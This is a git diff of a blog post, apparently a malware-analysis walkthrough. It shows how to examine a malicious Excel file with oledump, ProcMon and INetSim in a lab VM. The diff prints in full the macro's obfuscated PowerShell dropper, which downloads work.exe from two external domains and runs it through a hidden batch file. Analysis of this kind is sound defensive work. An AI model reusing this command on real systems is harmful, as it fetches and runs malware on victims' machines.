@@ -12,6 +12,7 @@ One of my favorite tools to use for examining malicious documents is [REMnux by 
 The first command we'll use is the following:
 
 `oledump.py sample.xls`
+
 ![oledump.py results on Remnux](/assets/images/happy_maldocs/remnux_oledump.JPG)
 
  This tells us that OLE streams 7,8,9,10,18,20,21,22 have VB script in them, so let's extract that using this command, where STREAM_NUMBER represents one of the previously listed values:
@@ -25,7 +26,7 @@ The first command we'll use is the following:
 Even without knowing much VB, it is clear that this Excel file opens a shell of some sort, so let's run it in a VM to verify. Thanks to Microsoft, you can get free 90-day virtual images of every OS since Windows 7 (all in 32-bit)! I used a Windows 7 VM loaded with Office, Sysmon, and I threw ProcMon on there for good measure. Once loaded, the document indeed opens a shell, noted by ProcMon's capture:
 ![ProcMon capturing Excel creating a shell](/assets/images/happy_maldocs/procmon_excel_launch_powershell.JPG)
 
-`powershell "'powershell ""function better([string] $qqqqqqqq_qqqqqq74_qqq){(new-object system.net.webclient).downloadfile($qqqqqqqq_qqqqqq74_qqq,''C:\Users\IEUser\AppData\Local\Temp\work.exe'');start-process ''C:\Users\IEUser\AppData\Local\Temp\work.exe'';}try{better(''http://carasaan.com/conte.ntet'')}catch{better(''http://mustardcafeonline.com/conte.ntet'')}'"" | out-file -encoding ascii -filepath C:\Users\IEUser\AppData\Local\Temp\qeneral.bat; start-process 'C:\Users\IEUser\AppData\Local\Temp\qeneral.bat' -windowstyle hidden"`
+```powershell powershell "'powershell ""function better([string] $qqqqqqqq_qqqqqq74_qqq){(new-object system.net.webclient).downloadfile($qqqqqqqq_qqqqqq74_qqq,''C:\Users\IEUser\AppData\Local\Temp\work.exe'');start-process ''C:\Users\IEUser\AppData\Local\Temp\work.exe'';}try{better(''http://carasaan.com/conte.ntet'')}catch{better(''http://mustardcafeonline.com/conte.ntet'')}'"" | out-file -encoding ascii -filepath C:\Users\IEUser\AppData\Local\Temp\qeneral.bat; start-process 'C:\Users\IEUser\AppData\Local\Temp\qeneral.bat' -windowstyle hidden"```
 
 So now we can see it attempts to download a file. Using REMnux again, we can setup a server that will deliver the file to the victim VM, allowing us to proceed further. To do this, we have configured REMnux to use a static IP address. Then, we use a handy script, `accept-all-ips start eth0` that configures REMnux to receive all incoming connections. To handle those connections, we use INetSim. I also configured INetSim to deliver the file mentioned in the previous Powershell command, so that when the victim VM sends an HTTP GET request for the file, it will be delivered as if the victim connected to the real domain. The following screenshots show the requests:
 ![Wireshark showing payload download](/assets/images/happy_maldocs/wireshark_get_payload_and_ip.JPG)
